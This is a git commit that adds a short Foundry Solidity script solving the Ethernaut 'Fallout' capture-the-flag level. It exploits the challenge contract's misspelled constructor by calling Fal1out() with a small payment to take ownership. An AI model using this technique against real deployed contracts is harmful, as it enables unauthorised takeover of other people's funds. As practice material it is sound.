a76e91565cd14e90d1c19bc125ee84a281ce6cda
hazem-dh <58445913+Hazem-dh@users.noreply.github.com>
2025-12-19 23:34:47 +0100

    solve fallout

---
+++ script/SolveFallout.sol
@@ -0,0 +1,19 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import {Script} from "forge-std/Script.sol";
+import {Fallout} from "../src/Fallout.sol";
+
+contract SolveFallout is Script {
+
+    Fallout public falloutContract;
+    function setUp() public {}
+
+    function run() public {
+        vm.startBroadcast();
+
+        falloutContract = Fallout(payable(vm.envAddress("FALLOUT_ADDRESS")));
+        falloutContract.Fal1out{value: 0.000001 ether}();
+        vm.stopBroadcast();
+    }
+}
